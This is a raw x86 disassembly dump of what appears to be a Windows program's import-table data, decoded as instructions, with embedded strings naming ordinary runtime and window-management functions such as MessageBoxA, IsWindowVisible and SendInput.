  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
